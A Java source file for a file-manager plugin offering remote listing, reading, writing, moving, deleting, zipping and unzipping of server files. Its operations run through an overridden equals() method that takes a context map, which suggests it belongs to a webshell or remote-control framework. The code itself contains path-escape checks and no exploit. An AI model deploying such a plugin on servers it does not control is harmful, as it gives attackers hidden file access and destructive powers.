package com.reajason.noone.plugin;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TimeZone;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * File manager plugin using JDK-only APIs and JDK6-compatible syntax.
 */
public class FileManagerPlugin {

    private static final String OP_LIST = "list";
    private static final String OP_STAT = "stat";
    private static final String OP_READ_ALL = "read-all";
    private static final String OP_READ_CHUNK = "read-chunk";
    private static final String OP_WRITE_ALL = "write-all";
    private static final String OP_WRITE_CHUNK = "write-chunk";
    private static final String OP_MKDIR = "mkdir";
    private static final String OP_CREATE_FILE = "create-file";
    private static final String OP_MOVE = "move";
    private static final String OP_COPY = "copy";
    private static final String OP_RENAME = "rename";
    private static final String OP_TOUCH = "touch";
    private static final String OP_DELETE = "delete";
    private static final String OP_ZIP = "zip";
    private static final String OP_UNZIP = "unzip";

    private static final String ERR_INVALID_ARG = "INVALID_ARG";
    private static final String ERR_NOT_FOUND = "NOT_FOUND";
    private static final String ERR_NOT_DIRECTORY = "NOT_DIRECTORY";
    private static final String ERR_ALREADY_EXISTS = "ALREADY_EXISTS";
    private static final String ERR_IO = "IO_ERROR";
    private static final String ERR_OFFSET = "OFFSET_OUT_OF_RANGE";
    private static final String ERR_TOO_LARGE = "FILE_TOO_LARGE";
    private static final String ERR_SECURITY = "SECURITY_ERROR";

    private static final int DEFAULT_CHUNK_LENGTH = 256 * 1024;

    @SuppressWarnings("unchecked")
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Map)) {
            return true;
        }

        Map<String, Object> ctx = (Map<String, Object>) obj;
        Map<String, Object> result = new HashMap<String, Object>();
        try {
            String op = asTrimString(ctx.get("op"));
            if (op == null || op.length() == 0) {
                fail(result, ERR_INVALID_ARG, "op is required");
                ctx.put("result", result);
                return true;
            }

            String cwd = normalizeCwd(asTrimString(ctx.get("cwd")));
            result.put("cwd", cwd);

            if (OP_LIST.equals(op)) {
                handleList(ctx, result, cwd);
            } else if (OP_STAT.equals(op)) {
                handleStat(ctx, result, cwd);
            } else if (OP_READ_ALL.equals(op)) {
                handleReadAll(ctx, result, cwd);
            } else if (OP_READ_CHUNK.equals(op)) {
                handleReadChunk(ctx, result, cwd);
            } else if (OP_WRITE_ALL.equals(op)) {
                handleWriteAll(ctx, result, cwd);
            } else if (OP_WRITE_CHUNK.equals(op)) {
                handleWriteChunk(ctx, result, cwd);
            } else if (OP_MKDIR.equals(op)) {
                handleMkdir(ctx, result, cwd);
            } else if (OP_CREATE_FILE.equals(op)) {
                handleCreateFile(ctx, result, cwd);
            } else if (OP_MOVE.equals(op)) {
                handleMoveOrCopy(ctx, result, cwd, true);
            } else if (OP_COPY.equals(op)) {
                handleMoveOrCopy(ctx, result, cwd, false);
            } else if (OP_RENAME.equals(op)) {
                handleRename(ctx, result, cwd);
            } else if (OP_TOUCH.equals(op)) {
                handleTouch(ctx, result, cwd);
            } else if (OP_DELETE.equals(op)) {
                handleDelete(ctx, result, cwd);
            } else if (OP_ZIP.equals(op)) {
                handleZip(ctx, result, cwd);
            } else if (OP_UNZIP.equals(op)) {
                handleUnzip(ctx, result, cwd);
            } else {
                fail(result, ERR_INVALID_ARG, "unsupported op: " + op);
            }
        } catch (Throwable t) {
            fail(result, ERR_IO, "File manager failed: " + safeMessage(t));
        }

        ctx.put("result", result);
        return true;
    }

    private static void handleList(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File dir = resolvePath(ctx.get("path"), cwd, true);
        ensureExists(dir);
        ensureDirectory(dir);

        File[] files = dir.listFiles();
        List<File> sorted = new ArrayList<File>();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                sorted.add(files[i]);
            }
        }
        sortFiles(sorted);

        List<Map<String, Object>> entries = new ArrayList<Map<String, Object>>();
        for (int i = 0; i < sorted.size(); i++) {
            entries.add(toEntry(sorted.get(i)));
        }
        result.put("path", canonicalPath(dir));
        result.put("entries", entries);
    }

    private static void sortFiles(List<File> files) {
        for (int i = 0; i < files.size(); i++) {
            for (int j = i + 1; j < files.size(); j++) {
                File a = files.get(i);
                File b = files.get(j);
                if (compareFiles(a, b) > 0) {
                    files.set(i, b);
                    files.set(j, a);
                }
            }
        }
    }

    private static int compareFiles(File a, File b) {
        if (a.isDirectory() && !b.isDirectory()) {
            return -1;
        }
        if (!a.isDirectory() && b.isDirectory()) {
            return 1;
        }
        return a.getName().compareToIgnoreCase(b.getName());
    }

    private static void handleStat(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File target = resolvePath(ctx.get("path"), cwd, true);
        ensureExists(target);
        result.put("entry", toEntry(target));
    }

    private static void handleReadAll(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File file = resolvePath(ctx.get("path"), cwd, true);
        ensureFile(file);

        long fileSize = file.length();
        long maxBytes = asLong(ctx.get("maxBytes"), -1L);
        if (maxBytes > -1 && fileSize > maxBytes) {
            fail(result, ERR_TOO_LARGE, "file exceeds maxBytes");
            result.put("fileSize", Long.valueOf(fileSize));
            return;
        }
        if (fileSize > Integer.MAX_VALUE) {
            fail(result, ERR_TOO_LARGE, "file is too large for read-all");
            result.put("fileSize", Long.valueOf(fileSize));
            return;
        }

        byte[] bytes = readAllBytes(file);
        result.put("bytes", bytes);
        result.put("fileSize", Long.valueOf(fileSize));
        result.put("path", canonicalPath(file));
    }

    private static void handleReadChunk(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File file = resolvePath(ctx.get("path"), cwd, true);
        ensureFile(file);

        long offset = asLong(ctx.get("offset"), 0L);
        int length = asInt(ctx.get("length"), DEFAULT_CHUNK_LENGTH);
        if (offset < 0) {
            fail(result, ERR_INVALID_ARG, "offset must be >= 0");
            return;
        }
        if (length <= 0) {
            fail(result, ERR_INVALID_ARG, "length must be > 0");
            return;
        }

        long fileSize = file.length();
        if (offset > fileSize) {
            fail(result, ERR_OFFSET, "offset exceeds file size");
            result.put("fileSize", Long.valueOf(fileSize));
            return;
        }

        RandomAccessFile raf = null;
        byte[] bytes = new byte[0];
        int read = 0;
        try {
            raf = new RandomAccessFile(file, "r");
            raf.seek(offset);
            int toRead = (int) Math.min((long) length, Math.max(0L, fileSize - offset));
            bytes = new byte[toRead];
            if (toRead > 0) {
                read = raf.read(bytes);
                if (read < 0) {
                    read = 0;
                }
                if (read < toRead) {
                    byte[] smaller = new byte[read];
                    System.arraycopy(bytes, 0, smaller, 0, read);
                    bytes = smaller;
                }
            }
        } finally {
            closeQuietly(raf);
        }

        long nextOffset = offset + read;
        result.put("bytes", bytes);
        result.put("offset", Long.valueOf(offset));
        result.put("nextOffset", Long.valueOf(nextOffset));
        result.put("eof", Boolean.valueOf(nextOffset >= fileSize));
        result.put("fileSize", Long.valueOf(fileSize));
        result.put("path", canonicalPath(file));
    }

    private static void handleWriteAll(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File file = resolvePath(ctx.get("path"), cwd, true);
        byte[] bytes = asBytes(ctx.get("bytes"));
        if (bytes == null) {
            fail(result, ERR_INVALID_ARG, "bytes is required");
            return;
        }

        ensureParent(file, asBoolean(ctx.get("createParent"), false));
        FileOutputStream output = null;
        try {
            output = new FileOutputStream(file, false);
            output.write(bytes);
            output.flush();
        } finally {
            closeQuietly(output);
        }

        result.put("path", canonicalPath(file));
        result.put("fileSize", Long.valueOf(file.length()));
        result.put("modifiedAt", isoTime(file.lastModified()));
    }

    private static void handleWriteChunk(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File file = resolvePath(ctx.get("path"), cwd, true);
        byte[] bytes = asBytes(ctx.get("bytes"));
        if (bytes == null) {
            fail(result, ERR_INVALID_ARG, "bytes is required");
            return;
        }

        long offset = asLong(ctx.get("offset"), 0L);
        boolean truncate = asBoolean(ctx.get("truncate"), false);
        if (offset < 0) {
            fail(result, ERR_INVALID_ARG, "offset must be >= 0");
            return;
        }

        ensureParent(file, asBoolean(ctx.get("createParent"), false));

        RandomAccessFile raf = null;
        try {
            raf = new RandomAccessFile(file, "rw");
            if (truncate) {
                raf.setLength(0L);
                if (offset != 0L) {
                    fail(result, ERR_INVALID_ARG, "offset must be 0 when truncate=true");
                    return;
                }
            }
            long currentLength = raf.length();
            if (offset > currentLength) {
                fail(result, ERR_OFFSET, "offset exceeds current file size");
                result.put("fileSize", Long.valueOf(currentLength));
                return;
            }
            raf.seek(offset);
            raf.write(bytes);
            long nextOffset = offset + bytes.length;
            long fileSize = raf.length();
            result.put("written", Integer.valueOf(bytes.length));
            result.put("nextOffset", Long.valueOf(nextOffset));
            result.put("fileSize", Long.valueOf(fileSize));
            result.put("path", canonicalPath(file));
            result.put("modifiedAt", isoTime(file.lastModified()));
        } finally {
            closeQuietly(raf);
        }
    }

    private static void handleMkdir(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File dir = resolvePath(ctx.get("path"), cwd, true);
        boolean recursive = asBoolean(ctx.get("recursive"), true);

        if (dir.exists()) {
            if (!dir.isDirectory()) {
                fail(result, ERR_ALREADY_EXISTS, "path exists and is not a directory");
                return;
            }
            result.put("path", canonicalPath(dir));
            result.put("created", Boolean.FALSE);
            return;
        }

        boolean created = recursive ? dir.mkdirs() : dir.mkdir();
        if (!created) {
            fail(result, ERR_IO, "failed to create directory");
            return;
        }
        result.put("path", canonicalPath(dir));
        result.put("created", Boolean.TRUE);
    }

    private static void handleCreateFile(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File file = resolvePath(ctx.get("path"), cwd, true);
        boolean overwrite = asBoolean(ctx.get("overwrite"), false);
        ensureParent(file, asBoolean(ctx.get("createParent"), false));

        if (file.exists()) {
            if (file.isDirectory()) {
                fail(result, ERR_ALREADY_EXISTS, "path exists and is a directory");
                return;
            }
            if (overwrite) {
                FileOutputStream output = null;
                try {
                    output = new FileOutputStream(file, false);
                    output.flush();
                } finally {
                    closeQuietly(output);
                }
            }
            result.put("path", canonicalPath(file));
            result.put("created", Boolean.FALSE);
            result.put("fileSize", Long.valueOf(file.length()));
            return;
        }

        boolean created = file.createNewFile();
        if (!created) {
            fail(result, ERR_IO, "failed to create file");
            return;
        }
        result.put("path", canonicalPath(file));
        result.put("created", Boolean.TRUE);
        result.put("fileSize", Long.valueOf(file.length()));
    }

    private static void handleMoveOrCopy(Map<String, Object> ctx, Map<String, Object> result, String cwd, boolean move) throws Exception {
        List<File> sources = parseSourcePaths(ctx.get("sourcePaths"), ctx.get("sourcePath"), cwd);
        if (sources.isEmpty()) {
            fail(result, ERR_INVALID_ARG, "sourcePaths is required");
            return;
        }
        File destination = resolvePath(ctx.get("destinationPath"), cwd, true);
        boolean overwrite = asBoolean(ctx.get("overwrite"), false);

        boolean destinationExists = destination.exists();
        boolean destinationIsDir = destinationExists && destination.isDirectory();
        if (sources.size() > 1 && !destinationIsDir) {
            fail(result, ERR_INVALID_ARG, "destinationPath must be an existing directory for multiple sources");
            return;
        }

        List<Map<String, String>> mappings = new ArrayList<Map<String, String>>();
        for (int i = 0; i < sources.size(); i++) {
            File source = sources.get(i);
            ensureExists(source);

            File target;
            if (destinationIsDir) {
                target = new File(destination, source.getName());
            } else if (!destinationExists && sources.size() == 1) {
                target = destination;
            } else {
                target = new File(destination, source.getName());
            }

            target = target.getCanonicalFile();
            source = source.getCanonicalFile();

            if (isSamePath(source, target)) {
                continue;
            }
            if (source.isDirectory() && isDescendantPath(target, source)) {
                fail(result, ERR_INVALID_ARG, "cannot move/copy directory into itself");
                return;
            }

            if (target.exists()) {
                if (!overwrite) {
                    fail(result, ERR_ALREADY_EXISTS, "target already exists: " + target.getPath());
                    return;
                }
                deleteRecursively(target);
            } else {
                ensureParent(target, true);
            }

            if (move) {
                movePath(source, target);
            } else {
                copyPath(source, target);
            }

            HashMap<String, String> mapping = new HashMap<String, String>();
            mapping.put("from", canonicalPath(source));
            mapping.put("to", canonicalPath(target));
            mappings.add(mapping);
        }

        result.put("mappings", mappings);
    }

    private static void handleRename(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File source = resolvePath(ctx.get("path"), cwd, true);
        ensureExists(source);

        String newName = asTrimString(ctx.get("newName"));
        if (newName == null || newName.length() == 0 || newName.indexOf('/') >= 0 || newName.indexOf('\\') >= 0) {
            fail(result, ERR_INVALID_ARG, "invalid newName");
            return;
        }

        File parent = source.getParentFile();
        if (parent == null) {
            fail(result, ERR_INVALID_ARG, "cannot rename root path");
            return;
        }

        File target = new File(parent, newName).getCanonicalFile();
        if (target.exists() && !isSamePath(source, target)) {
            fail(result, ERR_ALREADY_EXISTS, "target already exists");
            return;
        }

        movePath(source.getCanonicalFile(), target);
        result.put("from", canonicalPath(source));
        result.put("to", canonicalPath(target));
    }

    private static void handleTouch(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        List<File> paths = parseSourcePaths(ctx.get("paths"), ctx.get("path"), cwd);
        if (paths.isEmpty()) {
            fail(result, ERR_INVALID_ARG, "path or paths is required");
            return;
        }

        long modifiedAt = parseModifiedAt(ctx.get("modifiedAtEpochMs"), ctx.get("modifiedAt"));
        List<String> updatedPaths = new ArrayList<String>();

        for (int i = 0; i < paths.size(); i++) {
            File file = paths.get(i);
            ensureExists(file);
            boolean ok = file.setLastModified(modifiedAt);
            if (!ok) {
                fail(result, ERR_IO, "failed to update modified time: " + file.getPath());
                return;
            }
            updatedPaths.add(canonicalPath(file));
        }

        result.put("updatedPaths", updatedPaths);
        result.put("modifiedAt", isoTime(modifiedAt));
    }

    private static void handleDelete(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        List<File> paths = parseSourcePaths(ctx.get("paths"), ctx.get("path"), cwd);
        if (paths.isEmpty()) {
            fail(result, ERR_INVALID_ARG, "path or paths is required");
            return;
        }
        boolean recursive = asBoolean(ctx.get("recursive"), false);

        List<String> deleted = new ArrayList<String>();
        for (int i = 0; i < paths.size(); i++) {
            File file = paths.get(i);
            ensureExists(file);
            if (file.isDirectory() && !recursive) {
                fail(result, ERR_INVALID_ARG, "directory delete requires recursive=true: " + file.getPath());
                return;
            }
            deleteRecursively(file);
            deleted.add(canonicalPath(file));
        }

        result.put("deletedPaths", deleted);
    }

    private static void handleZip(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        List<File> rawSources = parseSourcePaths(ctx.get("sourcePaths"), ctx.get("sourcePath"), cwd);
        if (rawSources.isEmpty()) {
            fail(result, ERR_INVALID_ARG, "sourcePath or sourcePaths is required");
            return;
        }

        String destinationText = asTrimString(ctx.get("destinationPath"));
        if (destinationText == null) {
            fail(result, ERR_INVALID_ARG, "destinationPath is required");
            return;
        }

        boolean overwrite = asBoolean(ctx.get("overwrite"), false);
        boolean createParent = asBoolean(ctx.get("createParent"), true);
        File destination;
        try {
            destination = resolvePath(destinationText, cwd, true).getCanonicalFile();
        } catch (IllegalArgumentException e) {
            fail(result, ERR_INVALID_ARG, safeMessage(e));
            return;
        }

        ArrayList<File> sources = new ArrayList<File>();
        ArrayList<String> sourcePaths = new ArrayList<String>();
        for (int i = 0; i < rawSources.size(); i++) {
            File source = rawSources.get(i).getCanonicalFile();
            if (!source.exists()) {
                fail(result, ERR_NOT_FOUND, "source path does not exist: " + source.getPath());
                return;
            }
            if (isSamePath(source, destination)) {
                fail(result, ERR_INVALID_ARG, "destinationPath cannot be the same as source path");
                return;
            }
            if (source.isDirectory() && isDescendantPath(destination, source)) {
                fail(result, ERR_INVALID_ARG, "destinationPath cannot be inside source directory");
                return;
            }
            sources.add(source);
            sourcePaths.add(canonicalPath(source));
        }

        if (destination.exists()) {
            if (destination.isDirectory()) {
                fail(result, ERR_ALREADY_EXISTS, "destinationPath exists and is a directory");
                return;
            }
            if (!overwrite) {
                fail(result, ERR_ALREADY_EXISTS, "destinationPath already exists");
                return;
            }
        }

        ZipOutputStream zipOutput = null;
        try {
            ensureParent(destination, createParent);
            zipOutput = new ZipOutputStream(new FileOutputStream(destination, false));
            Set<String> entryNames = new HashSet<String>();
            int[] entryCounter = new int[]{0};
            for (int i = 0; i < sources.size(); i++) {
                File source = sources.get(i);
                String baseName = source.getName();
                if (baseName == null || baseName.length() == 0) {
                    baseName = "root";
                }
                String entryName = normalizeZipEntryName(baseName, source.isDirectory());
                writeZipPath(source, entryName, zipOutput, entryNames, entryCounter);
            }
            zipOutput.finish();
            result.put("archivePath", canonicalPath(destination));
            result.put("archiveSize", Long.valueOf(destination.length()));
            result.put("entryCount", Integer.valueOf(entryCounter[0]));
            result.put("sourcePaths", sourcePaths);
        } catch (IllegalArgumentException e) {
            fail(result, ERR_INVALID_ARG, safeMessage(e));
        } catch (IOException e) {
            fail(result, ERR_IO, safeMessage(e));
        } finally {
            closeQuietly(zipOutput);
        }
    }

    private static void handleUnzip(Map<String, Object> ctx, Map<String, Object> result, String cwd) throws Exception {
        File archive;
        try {
            archive = resolvePath(ctx.get("path"), cwd, true).getCanonicalFile();
        } catch (IllegalArgumentException e) {
            fail(result, ERR_INVALID_ARG, safeMessage(e));
            return;
        }
        if (!archive.exists()) {
            fail(result, ERR_NOT_FOUND, "path does not exist: " + archive.getPath());
            return;
        }
        if (!archive.isFile()) {
            fail(result, ERR_INVALID_ARG, "path must be a file");
            return;
        }
        if (!hasZipMagic(archive)) {
            fail(result, ERR_INVALID_ARG, "path is not a zip file");
            return;
        }

        String destinationText = asTrimString(ctx.get("destinationPath"));
        if (destinationText == null) {
            fail(result, ERR_INVALID_ARG, "destinationPath is required");
            return;
        }

        boolean overwrite = asBoolean(ctx.get("overwrite"), false);
        boolean createParent = asBoolean(ctx.get("createParent"), true);
        File destination;
        try {
            destination = resolvePath(destinationText, cwd, true).getCanonicalFile();
            if (destination.exists() && !destination.isDirectory()) {
                fail(result, ERR_INVALID_ARG, "destinationPath exists and is not a directory");
                return;
            }
            if (!destination.exists()) {
                ensureParent(destination, createParent);
                if (!destination.mkdirs()) {
                    fail(result, ERR_IO, "failed to create destination directory");
                    return;
                }
            }
        } catch (IllegalArgumentException e) {
            fail(result, ERR_INVALID_ARG, safeMessage(e));
            return;
        } catch (IOException e) {
            fail(result, ERR_IO, safeMessage(e));
            return;
        }

        ZipInputStream zipInput = null;
        long writtenBytes = 0L;
        int fileCount = 0;
        int dirCount = 0;
        try {
            zipInput = new ZipInputStream(new FileInputStream(archive));
            ZipEntry entry;
            while ((entry = zipInput.getNextEntry()) != null) {
                String entryName = sanitizeZipEntryName(entry.getName(), entry.isDirectory());
                if (entryName.length() == 0) {
                    zipInput.closeEntry();
                    continue;
                }
                File target = resolveZipEntryTarget(destination, entryName);
                if (entry.isDirectory()) {
                    prepareUnzipTarget(target, true, overwrite);
                    dirCount++;
                    zipInput.closeEntry();
                    continue;
                }

                File parent = target.getParentFile();
                if (parent != null) {
                    prepareUnzipTarget(parent, true, overwrite);
                }
                prepareUnzipTarget(target, false, overwrite);
                FileOutputStream output = null;
                try {
                    output = new FileOutputStream(target, false);
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = zipInput.read(buffer)) != -1) {
                        output.write(buffer, 0, len);
                        writtenBytes += len;
                    }
                    output.flush();
                } finally {
                    closeQuietly(output);
                }
                long entryTime = entry.getTime();
                if (entryTime > 0L) {
                    target.setLastModified(entryTime);
                }
                fileCount++;
                zipInput.closeEntry();
            }
        } catch (SecurityException e) {
            fail(result, ERR_SECURITY, safeMessage(e));
            return;
        } catch (IllegalArgumentException e) {
            String message = safeMessage(e);
            if (message.startsWith("target already exists:")) {
                fail(result, ERR_ALREADY_EXISTS, message);
            } else {
                fail(result, ERR_INVALID_ARG, message);
            }
            return;
        } catch (IOException e) {
            fail(result, ERR_IO, safeMessage(e));
            return;
        } finally {
            closeQuietly(zipInput);
        }

        result.put("archivePath", canonicalPath(archive));
        result.put("destinationPath", canonicalPath(destination));
        result.put("fileCount", Integer.valueOf(fileCount));
        result.put("dirCount", Integer.valueOf(dirCount));
        result.put("writtenBytes", Long.valueOf(writtenBytes));
    }

    private static void movePath(File source, File target) throws Exception {
        if (source.renameTo(target)) {
            return;
        }
        copyPath(source, target);
        deleteRecursively(source);
    }

    private static void copyPath(File source, File target) throws Exception {
        if (source.isDirectory()) {
            if (!target.exists() && !target.mkdirs()) {
                throw new IOException("failed to create directory: " + target.getPath());
            }
            File[] children = source.listFiles();
            if (children == null) {
                return;
            }
            for (int i = 0; i < children.length; i++) {
                File child = children[i];
                File childTarget = new File(target, child.getName());
                copyPath(child, childTarget);
            }
            return;
        }

        FileInputStream input = null;
        FileOutputStream output = null;
        try {
            input = new FileInputStream(source);
            output = new FileOutputStream(target, false);
            byte[] buffer = new byte[8192];
            int len;
            while ((len = input.read(buffer)) != -1) {
                output.write(buffer, 0, len);
            }
            output.flush();
        } finally {
            closeQuietly(input);
            closeQuietly(output);
        }
        target.setLastModified(source.lastModified());
    }

    private static void writeZipPath(File source, String entryName, ZipOutputStream zipOutput, Set<String> entryNames, int[] entryCounter) throws Exception {
        if (source.isDirectory()) {
            String normalizedDirectoryName = normalizeZipEntryName(entryName, true);
            ensureUniqueZipEntry(entryNames, normalizedDirectoryName);
            ZipEntry directoryEntry = new ZipEntry(normalizedDirectoryName);
            directoryEntry.setTime(source.lastModified());
            zipOutput.putNextEntry(directoryEntry);
            zipOutput.closeEntry();
            entryCounter[0] = entryCounter[0] + 1;

            File[] children = source.listFiles();
            if (children == null) {
                return;
            }
            List<File> sortedChildren = new ArrayList<File>();
            for (int i = 0; i < children.length; i++) {
                sortedChildren.add(children[i]);
            }
            sortFiles(sortedChildren);
            for (int i = 0; i < sortedChildren.size(); i++) {
                File child = sortedChildren.get(i);
                String childEntryName = normalizedDirectoryName + child.getName();
                if (child.isDirectory()) {
                    childEntryName = childEntryName + "/";
                }
                writeZipPath(child, childEntryName, zipOutput, entryNames, entryCounter);
            }
            return;
        }

        String normalizedFileName = normalizeZipEntryName(entryName, false);
        ensureUniqueZipEntry(entryNames, normalizedFileName);
        ZipEntry fileEntry = new ZipEntry(normalizedFileName);
        fileEntry.setTime(source.lastModified());
        zipOutput.putNextEntry(fileEntry);
        FileInputStream input = null;
        try {
            input = new FileInputStream(source);
            byte[] buffer = new byte[8192];
            int len;
            while ((len = input.read(buffer)) != -1) {
                zipOutput.write(buffer, 0, len);
            }
        } finally {
            closeQuietly(input);
            zipOutput.closeEntry();
        }
        entryCounter[0] = entryCounter[0] + 1;
    }

    private static void ensureUniqueZipEntry(Set<String> entryNames, String entryName) {
        if (entryNames.contains(entryName)) {
            throw new IllegalArgumentException("duplicate zip entry name: " + entryName);
        }
        entryNames.add(entryName);
    }

    private static String normalizeZipEntryName(String entryName, boolean directory) {
        String normalized = entryName == null ? "" : entryName.replace('\\', '/');
        while (normalized.startsWith("/")) {
            normalized = normalized.substring(1);
        }
        while (!directory && normalized.endsWith("/")) {
            normalized = normalized.substring(0, normalized.length() - 1);
        }
        if (directory && !normalized.endsWith("/")) {
            normalized = normalized + "/";
        }
        return normalized;
    }

    private static String sanitizeZipEntryName(String rawName, boolean directory) {
        if (rawName == null) {
            throw new SecurityException("zip entry name is null");
        }
        if (rawName.startsWith("/") || rawName.startsWith("\\")) {
            throw new SecurityException("zip entry cannot be absolute path: " + rawName);
        }
        String normalized = normalizeZipEntryName(rawName, directory);
        if (normalized.length() == 0) {
            return normalized;
        }
        if (normalized.indexOf(':') >= 0) {
            throw new SecurityException("zip entry cannot contain drive letter: " + rawName);
        }
        if (normalized.indexOf('\u0000') >= 0) {
            throw new SecurityException("zip entry contains invalid null byte: " + rawName);
        }

        String[] parts = normalized.split("/");
        StringBuilder rebuilt = new StringBuilder();
        for (int i = 0; i < parts.length; i++) {
            String part = parts[i];
            if (part == null || part.length() == 0 || ".".equals(part)) {
                continue;
            }
            if ("..".equals(part)) {
                throw new SecurityException("zip entry cannot escape destination: " + rawName);
            }
            if (rebuilt.length() > 0) {
                rebuilt.append('/');
            }
            rebuilt.append(part);
        }

        String rebuiltText = rebuilt.toString();
        if (rebuiltText.length() == 0) {
            return rebuiltText;
        }
        if (directory && !rebuiltText.endsWith("/")) {
            return rebuiltText + "/";
        }
        return rebuiltText;
    }

    private static File resolveZipEntryTarget(File destination, String entryName) throws Exception {
        File candidate = new File(destination, entryName).getCanonicalFile();
        if (!isSamePath(candidate, destination) && !isDescendantPath(candidate, destination)) {
            throw new SecurityException("zip entry resolves outside destination: " + entryName);
        }
        return candidate;
    }

    private static void prepareUnzipTarget(File target, boolean directory, boolean overwrite) throws Exception {
        if (target.exists()) {
            if (directory && target.isDirectory()) {
                return;
            }
            if (!overwrite) {
                throw new IllegalArgumentException("target already exists: " + target.getPath());
            }
            deleteRecursively(target);
        }

        if (directory) {
            if (!target.mkdirs() && !target.isDirectory()) {
                throw new IOException("failed to create directory: " + target.getPath());
            }
            return;
        }

        File parent = target.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            throw new IOException("failed to create parent directory: " + parent.getPath());
        }
    }

    private static boolean hasZipMagic(File file) throws Exception {
        if (file == null || !file.isFile() || file.length() < 4) {
            return false;
        }
        FileInputStream input = null;
        try {
            input = new FileInputStream(file);
            int b0 = input.read();
            int b1 = input.read();
            int b2 = input.read();
            int b3 = input.read();
            if (b0 != 0x50 || b1 != 0x4B) {
                return false;
            }
            return (b2 == 0x03 && b3 == 0x04) || (b2 == 0x05 && b3 == 0x06) || (b2 == 0x07 && b3 == 0x08);
        } finally {
            closeQuietly(input);
        }
    }

    private static void deleteRecursively(File file) throws Exception {
        if (!file.exists()) {
            return;
        }
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (int i = 0; i < children.length; i++) {
                    deleteRecursively(children[i]);
                }
            }
        }
        if (!file.delete()) {
            throw new IOException("failed to delete: " + file.getPath());
        }
    }

    private static List<File> parseSourcePaths(Object rawPaths, Object rawSinglePath, String cwd) throws Exception {
        List<File> files = new ArrayList<File>();
        if (rawPaths instanceof Iterable<?>) {
            Iterator<?> iterator = ((Iterable<?>) rawPaths).iterator();
            while (iterator.hasNext()) {
                Object item = iterator.next();
                if (item == null) {
                    continue;
                }
                files.add(resolvePath(item, cwd, true));
            }
            return files;
        }

        if (rawPaths != null && rawPaths.getClass().isArray()) {
            int len = java.lang.reflect.Array.getLength(rawPaths);
            for (int i = 0; i < len; i++) {
                Object item = java.lang.reflect.Array.get(rawPaths, i);
                if (item == null) {
                    continue;
                }
                files.add(resolvePath(item, cwd, true));
            }
            return files;
        }

        String single = asTrimString(rawSinglePath != null ? rawSinglePath : rawPaths);
        if (single != null && single.length() > 0) {
            files.add(resolvePath(single, cwd, true));
        }
        return files;
    }

    private static Map<String, Object> toEntry(File file) throws Exception {
        HashMap<String, Object> entry = new HashMap<String, Object>();
        String path = canonicalPath(file);
        File parent = file.getParentFile();
        entry.put("name", file.getName().length() == 0 ? path : file.getName());
        entry.put("path", path);
        entry.put("parentPath", parent == null ? null : canonicalPath(parent));
        entry.put("entryType", file.isDirectory() ? "directory" : "file");
        entry.put("sizeBytes", Long.valueOf(file.isDirectory() ? 0L : file.length()));
        entry.put("createdAt", isoTime(file.lastModified()));
        entry.put("modifiedAt", isoTime(file.lastModified()));
        entry.put("permissions", permissions(file));
        entry.put("fileType", inferFileType(file));
        return entry;
    }

    private static String inferFileType(File file) {
        if (file.isDirectory()) {
            return "Folder";
        }
        String name = file.getName().toLowerCase();
        String ext = "";
        int dot = name.lastIndexOf('.');
        if (dot > 0 && dot < name.length() - 1) {
            ext = name.substring(dot + 1);
        }
        if (contains(ext, new String[]{"md", "txt", "pdf", "doc", "docx"})) {
            return "Document";
        }
        if (contains(ext, new String[]{"ts", "tsx", "js", "jsx", "java", "go", "py", "rs", "json", "yaml", "yml"})) {
            return "Code";
        }
        if (contains(ext, new String[]{"png", "jpg", "jpeg", "gif", "svg", "webp"})) {
            return "Image";
        }
        if (contains(ext, new String[]{"zip", "tar", "gz", "rar", "7z"})) {
            return "Archive";
        }
        if (contains(ext, new String[]{"mp3", "wav", "flac"})) {
            return "Audio";
        }
        if (contains(ext, new String[]{"mp4", "avi", "mov", "mkv"})) {
            return "Video";
        }
        return "File";
    }

    private static boolean contains(String value, String[] candidates) {
        for (int i = 0; i < candidates.length; i++) {
            if (candidates[i].equals(value)) {
                return true;
            }
        }
        return false;
    }

    private static String permissions(File file) {
        char type = file.isDirectory() ? 'd' : '-';
        char read = file.canRead() ? 'r' : '-';
        char write = file.canWrite() ? 'w' : '-';
        char exec = file.canExecute() ? 'x' : '-';
        String triad = "" + read + write + exec;
        return type + triad + triad + triad;
    }

    private static long parseModifiedAt(Object epochObj, Object textObj) {
        long epoch = asLong(epochObj, Long.MIN_VALUE);
        if (epoch != Long.MIN_VALUE) {
            return epoch;
        }
        String text = asTrimString(textObj);
        if (text != null && text.length() > 0) {
            try {
                return Long.parseLong(text);
            } catch (Exception ignored) {
            }
            long parsed = parseIsoDate(text, "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
            if (parsed > 0) {
                return parsed;
            }
            parsed = parseIsoDate(text, "yyyy-MM-dd'T'HH:mm:ss'Z'");
            if (parsed > 0) {
                return parsed;
            }
            String tzText = normalizeTimezoneText(text);
            parsed = parseIsoDate(tzText, "yyyy-MM-dd'T'HH:mm:ss.SSSZ");
            if (parsed > 0) {
                return parsed;
            }
            parsed = parseIsoDate(tzText, "yyyy-MM-dd'T'HH:mm:ssZ");
